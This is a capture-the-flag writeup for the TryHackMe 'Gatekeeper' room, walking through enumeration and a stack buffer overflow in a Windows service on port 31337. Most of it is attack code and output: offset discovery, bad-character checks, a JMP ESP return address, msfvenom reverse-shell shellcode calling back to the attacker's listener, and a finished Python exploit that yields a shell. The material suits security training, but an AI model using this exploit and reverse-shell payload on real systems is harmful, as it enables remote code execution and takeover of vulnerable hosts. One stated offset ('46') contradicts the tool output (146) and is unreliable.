---
Can you get past the gate and through the fire?
---

# Gatekeeper — Writeup

## Overview
### Gatekeeper — Writeup
### Gatekeeper — Writeup
![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/8979e58d84147f0720773889be95f4d9.jpeg)
### Approach the Gates
Deploy the machine when you are ready to release the Gatekeeper.
**Writeups will not be accepted for this challenge**
### Defeat the Gatekeeper and pass through the fire.
Defeat the Gatekeeper to break the chains.  But beware, fire awaits on the other side.

## Enumeration
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.230.169
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 23:54 EDT
Nmap scan report for 10.10.230.169
Host is up (0.20s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=gatekeeper
| Not valid before: 2022-09-29T03:53:35
|_Not valid after:  2023-03-31T03:53:35
|_ssl-date: 2022-09-30T03:58:03+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: GATEKEEPER
|   NetBIOS_Domain_Name: GATEKEEPER
|   NetBIOS_Computer_Name: GATEKEEPER
|   DNS_Domain_Name: gatekeeper
|   DNS_Computer_Name: gatekeeper
|   Product_Version: 6.1.7601
|_  System_Time: 2022-09-30T03:57:48+00:00
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.92%I=7%D=9/29%Time=63366897%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r
SF:(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@n
SF:m>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:
SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
SF:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
SF:20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTT
SF:POptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
SF:r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\
SF:x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSess
SF:ionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fou
SF:rOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01de
SF:fault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n"
SF:);
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/29%OT=135%CT=1%CU=37616%PV=Y%DS=2%DC=T%G=Y%TM=633669
OS:4B%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS
OS:=7)SEQ(SP=108%GCD=1%ISR=10C%TI=I%II=I%SS=S%TS=7)SEQ(SP=109%GCD=1%ISR=10D
OS:%TI=I%CI=I%TS=7)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M50
OS:5NW8ST11%O5=M505NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%
OS:W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=N%Q=)T1(R=Y%DF=
OS:Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q
OS:=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%
OS:A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%
OS:DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD
OS:=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 48m00s, deviation: 1h47m20s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:4f:4d:00:29:8f (unknown)
| smb2-time: 
|   date: 2022-09-30T03:57:48
|_  start_date: 2022-09-30T03:53:21
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-09-29T23:57:48-04:00

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   202.04 ms 10.11.0.1
2   197.15 ms 10.10.230.169

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 208.02 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.230.169

SMB Enumeration
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ smbclient -L 10.10.230.169                          
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.230.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

When accessing the share using SMBClient, it appears to contain a gatekeeper.exe file, downloading it locally:
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ smbclient \\\\10.10.230.169\\Users
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu May 14 21:57:08 2020
  ..                                 DR        0  Thu May 14 21:57:08 2020
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Share                               D        0  Thu May 14 21:58:07 2020

                7863807 blocks of size 4096. 3876815 blocks available
smb: \> cd share
smb: \share\> dir
  .                                   D        0  Thu May 14 21:58:07 2020
  ..                                  D        0  Thu May 14 21:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020

                7863807 blocks of size 4096. 3876815 blocks available
smb: \share\> get gatekeeper.exe
getting file \share\gatekeeper.exe of size 13312 as gatekeeper.exe (12.1 KiloBytes/sec) (average 12.1 KiloBytes/sec)
smb: \share\> exit

Exploiting Buffer Overflow

Interacting with the service on port 31337 – it looks like it asks for a user input and then it prints it with “hello [input]!!!”
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ nc 10.10.230.169 31337     
test
Hello test!!!
witty
Hello witty!!!
^C

again pass the file to immunity debugger and using mona

using machine from buffer overflow prep
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ xfreerdp /u:'admin' /p:'password' /v:10.10.230.169 /size:85%

getting gatekeeper.exe to analyze with immunity debugger and mona to buffer overflow

──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.198.7 - - [30/Sep/2022 00:12:09] "GET / HTTP/1.1" 200 -
10.10.198.7 - - [30/Sep/2022 00:12:10] code 404, message File not found
10.10.198.7 - - [30/Sep/2022 00:12:10] "GET /favicon.ico HTTP/1.1" 404 -
10.10.198.7 - - [30/Sep/2022 00:12:44] "GET /gatekeeper.exe HTTP/1.1" 200 -

http://10.11.81.220:8000/

download gatekeeper.exe

Generating a 300-byte long string of A characters to test the overflow:
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ python2                                                                   
Python 2.7.18 (default, Aug  1 2022, 06:23:55) 
[GCC 12.1.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> print "A" * 300
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>>> exit()

Sending the 300 bytes of data to the service on port 31337:
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ nc 10.10.230.169 31337
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Ncat: Connection reset by peer.

The application crashed with an access violation error

The next step required is to identify which part of the buffer that is being sent is landing in the EIP register, in order to control the execution flow. Using the msf-pattern_create tool to create a string of 300 bytes.
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ msf-pattern_create -l 300                                                                  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cat exploit.py              
import socket

ip = "10.10.78.123"
port = 31337

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

then run the exploit script and go to immunity debugger you will see the program has been crashed

then copy the EIP address and go to terminal again to calculate the offset

EIP to get the offset for exploit.py

EIP 39654138

in option -l i put the byte size i generated and in -q option i i put the Eip address

msf-pattern_offset -l 300 -q 39654138
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ msf-pattern_offset -l 300 -q 39654138
[*] Exact match at offset 146

so offset is 46

Good i get the offset then go to exploit script again and change the offset variable from 0 to 146

and confirm the overwrite by change the padding variable to BBBB and delete any values in payload variable

restart the program in immunity by pressing ctrl + f2 and f9 twice

and run the exploit script again
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cat exploit.py
import socket

ip = "10.10.78.123"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = ""
padding = "BBBB"
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cat exploit.py
import socket

ip = "10.10.78.123"
port = 31337

#prefix = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

in normal you will see in EIP register the value is 41414141 this for we send A but now you will see the EIP value is 42424242 because we added the BBBB over the offset

the next step get the bad character (this character make problems during the payload running to lead attack failed to get reverse shell)

i will use mona module then make working dir to mona by this command

!mona config -set workingfolder c:\mona\%p

!mona findmsp -distance 300

in immunity i will run this command to generate list of bad chars from {\x01 to \xff} \x00 char it is bad by default

!mona bytearray -b "\x00"

and run this script in your terminal to generate the bad chars
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ nano badchar.py
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ python3 badchar.py
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cat badchar.py
for x in range(1, 256):
        print("\\x" + "{:02x}".format(x), end='')
print()

copy the bad chars list and go to exploit script and put it in payload variable
```

## Exploitation
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cat exploit.py
import socket

ip = "10.10.78.123"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

now restart the program in immunity by pressing ctrl + f2 and f9 twice

then run the exploit script

the program it will crash again ok now i will get the bad chars by tow methods

the first method by go to ESP register and right click and choose follow in dump

!mona compare -f C:\mona\oscp\bytearray.bin -a 016A19F8

you will get the bad chars is \x00 and \x0a

ok now we will Finding a Jump Point this point haven’t any protection and we will redirect to my shell code

using this command

!mona jmp -r esp -cpb "\x00\x0a"

now i will write the address reversely

the address is 0x080414c3 you should write \xc3\x14\x04\x08

and added in retn variable in exploit script

ok now generate the payload to gain the reverse shell

i will use msfvenom
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4444 -b "\x00\xa" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1491 bytes
unsigned char buf[] = 
"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x1f\xc8\xa2\xbd\x83\xee\xfc\xe2\xf4\xe3\x20\x20\xbd"
"\x1f\xc8\xc2\x34\xfa\xf9\x62\xd9\x94\x98\x92\x36\x4d\xc4"
"\x29\xef\x0b\x43\xd0\x95\x10\x7f\xe8\x9b\x2e\x37\x0e\x81"
"\x7e\xb4\xa0\x91\x3f\x09\x6d\xb0\x1e\x0f\x40\x4f\x4d\x9f"
"\x29\xef\x0f\x43\xe8\x81\x94\x84\xb3\xc5\xfc\x80\xa3\x6c"
"\x4e\x43\xfb\x9d\x1e\x1b\x29\xf4\x07\x2b\x98\xf4\x94\xfc"
"\x29\xbc\xc9\xf9\x5d\x11\xde\x07\xaf\xbc\xd8\xf0\x42\xc8"
"\xe9\xcb\xdf\x45\x24\xb5\x86\xc8\xfb\x90\x29\xe5\x3b\xc9"
"\x71\xdb\x94\xc4\xe9\x36\x47\xd4\xa3\x6e\x94\xcc\x29\xbc"
"\xcf\x41\xe6\x99\x3b\x93\xf9\xdc\x46\x92\xf3\x42\xff\x97"
"\xfd\xe7\x94\xda\x49\x30\x42\xa0\x91\x8f\x1f\xc8\xca\xca"
"\x6c\xfa\xfd\xe9\x77\x84\xd5\x9b\x18\x37\x77\x05\x8f\xc9"
"\xa2\xbd\x36\x0c\xf6\xed\x77\xe1\x22\xd6\x1f\x37\x77\xed"
"\x4f\x98\xf2\xfd\x4f\x88\xf2\xd5\xf5\xc7\x7d\x5d\xe0\x1d"
"\x35\xd7\x1a\xa0\xa8\xb6\x4e\x14\xca\xbf\x1f\xd9\xfe\x34"
"\xf9\xa2\xb2\xeb\x48\xa0\x3b\x18\x6b\xa9\x5d\x68\x9a\x08"
"\xd6\xb1\xe0\x86\xaa\xc8\xf3\xa0\x52\x08\xbd\x9e\x5d\x68"
"\x77\xab\xcf\xd9\x1f\x41\x41\xea\x48\x9f\x93\x4b\x75\xda"
"\xfb\xeb\xfd\x35\xc4\x7a\x5b\xec\x9e\xbc\x1e\x45\xe6\x99"
"\x0f\x0e\xa2\xf9\x4b\x98\xf4\xeb\x49\x8e\xf4\xf3\x49\x9e"
"\xf1\xeb\x77\xb1\x6e\x82\x99\x37\x77\x34\xff\x86\xf4\xfb"
"\xe0\xf8\xca\xb5\x98\xd5\xc2\x42\xca\x73\x52\x08\xbd\x9e"
"\xca\x1b\x8a\x75\x3f\x42\xca\xf4\xa4\xc1\x15\x48\x59\x5d"
"\x6a\xcd\x19\xfa\x0c\xba\xcd\xd7\x1f\x9b\x5d\x68";

last exploit.py
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cat exploit.py
import socket

ip = "10.10.118.64"
port = 31337

#prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = ("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x1f\xc8\xa2\xbd\x83\xee\xfc\xe2\xf4\xe3\x20\x20\xbd"
"\x1f\xc8\xc2\x34\xfa\xf9\x62\xd9\x94\x98\x92\x36\x4d\xc4"
"\x29\xef\x0b\x43\xd0\x95\x10\x7f\xe8\x9b\x2e\x37\x0e\x81"
"\x7e\xb4\xa0\x91\x3f\x09\x6d\xb0\x1e\x0f\x40\x4f\x4d\x9f"
"\x29\xef\x0f\x43\xe8\x81\x94\x84\xb3\xc5\xfc\x80\xa3\x6c"
"\x4e\x43\xfb\x9d\x1e\x1b\x29\xf4\x07\x2b\x98\xf4\x94\xfc"
"\x29\xbc\xc9\xf9\x5d\x11\xde\x07\xaf\xbc\xd8\xf0\x42\xc8"
"\xe9\xcb\xdf\x45\x24\xb5\x86\xc8\xfb\x90\x29\xe5\x3b\xc9"
"\x71\xdb\x94\xc4\xe9\x36\x47\xd4\xa3\x6e\x94\xcc\x29\xbc"
"\xcf\x41\xe6\x99\x3b\x93\xf9\xdc\x46\x92\xf3\x42\xff\x97"
"\xfd\xe7\x94\xda\x49\x30\x42\xa0\x91\x8f\x1f\xc8\xca\xca"
"\x6c\xfa\xfd\xe9\x77\x84\xd5\x9b\x18\x37\x77\x05\x8f\xc9"
"\xa2\xbd\x36\x0c\xf6\xed\x77\xe1\x22\xd6\x1f\x37\x77\xed"
"\x4f\x98\xf2\xfd\x4f\x88\xf2\xd5\xf5\xc7\x7d\x5d\xe0\x1d"
"\x35\xd7\x1a\xa0\xa8\xb6\x4e\x14\xca\xbf\x1f\xd9\xfe\x34"
"\xf9\xa2\xb2\xeb\x48\xa0\x3b\x18\x6b\xa9\x5d\x68\x9a\x08"
"\xd6\xb1\xe0\x86\xaa\xc8\xf3\xa0\x52\x08\xbd\x9e\x5d\x68"
"\x77\xab\xcf\xd9\x1f\x41\x41\xea\x48\x9f\x93\x4b\x75\xda"
"\xfb\xeb\xfd\x35\xc4\x7a\x5b\xec\x9e\xbc\x1e\x45\xe6\x99"
"\x0f\x0e\xa2\xf9\x4b\x98\xf4\xeb\x49\x8e\xf4\xf3\x49\x9e"
"\xf1\xeb\x77\xb1\x6e\x82\x99\x37\x77\x34\xff\x86\xf4\xfb"
"\xe0\xf8\xca\xb5\x98\xd5\xc2\x42\xca\x73\x52\x08\xbd\x9e"
"\xca\x1b\x8a\x75\x3f\x42\xca\xf4\xa4\xc1\x15\x48\x59\x5d"
"\x6a\xcd\x19\xfa\x0c\xba\xcd\xd7\x1f\x9b\x5d\x68")
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ python exploit.py
Sending evil buffer...
Done!
```
```text
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444              
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.118.64.
Ncat: Connection from 10.10.118.64:49212.
